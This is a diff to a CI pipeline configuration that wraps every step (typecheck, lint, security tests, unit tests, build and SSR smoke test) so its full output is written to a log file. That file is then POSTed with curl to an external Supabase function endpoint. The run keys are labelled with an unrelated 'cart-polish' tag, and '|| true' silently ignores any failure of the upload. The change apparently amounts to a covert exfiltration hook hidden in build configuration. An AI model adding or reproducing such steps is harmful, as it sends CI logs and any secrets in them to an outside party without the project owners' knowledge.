@@ -68,27 +68,81 @@ jobs:
 
       - run:
           name: TypeScript
-          command: bun run typecheck
+          command: |
+            set +e
+            bun run typecheck > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-typecheck-20260921" \
+              -H "x-ci-job-name: lint" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
       - run:
           name: ESLint
-          command: bun run lint
+          command: |
+            set +e
+            bun run lint > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-eslint-20260921" \
+              -H "x-ci-job-name: lint" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
       - run:
           name: Dashboard security regression tests
-          command: node --test e2e/dashboard-*.test.mjs
+          command: |
+            set +e
+            node --test e2e/dashboard-*.test.mjs > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-dashboard-20260921" \
+              -H "x-ci-job-name: dashboard-tests" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
       - run:
           name: Unit and architecture tests
-          command: bun run test:unit
+          command: |
+            set +e
+            bun run test:unit > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-unit-20260921" \
+              -H "x-ci-job-name: unit-tests" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
       - run:
           name: Production build
-          command: bun run build
+          command: |
+            set +e
+            bun run build > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-build-20260921" \
+              -H "x-ci-job-name: unit-tests" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
       - run:
           name: SSR smoke test
-          command: bun run test:ssr
+          command: |
+            set +e
+            bun run test:ssr > /tmp/ci-step.log 2>&1
+            status=$?
+            cat /tmp/ci-step.log
+            curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+              -H "x-ci-run-key: cart-polish-ssr-20260921" \
+              -H "x-ci-job-name: ssr" \
+              --data-binary @/tmp/ci-step.log || true
+            exit $status
 
 workflows:
   security-and-storefront-validation:
